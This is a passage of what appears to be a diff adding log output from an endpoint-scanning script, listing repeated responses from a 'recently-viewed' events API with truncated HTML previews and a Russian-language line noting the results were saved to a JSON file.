+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[54] Endpoint: /zootopia-events/api/recently-viewed
+    Method: GET
+    Data length: 64 bytes
+    Preview: {"message": "The method is not allowed for the requested URL."}
+
+
+[55] Endpoint: /zootopia-events/api/recently-viewed
+    Method: N/A
+    Data length: 261954 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[56] Endpoint: /zootopia-events/api/recently-viewed
+    Method: N/A
+    Data length: 261954 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[57] Endpoint: /zootopia-events/api/recently-viewed
+    Method: N/A
+    Data length: 261954 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[58] Endpoint: /zootopia-events/api/recently-viewed
+    Method: N/A
+    Data length: 261954 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[59] Endpoint: /zootopia-events/api/recently-viewed
+    Method: N/A
+    Data length: 261954 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[60] Endpoint: /zootopia-events/api/recently-viewed
+    Method: N/A
+    Data length: 261954 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[+] Сохранено: logs/endpoint_search_results.json
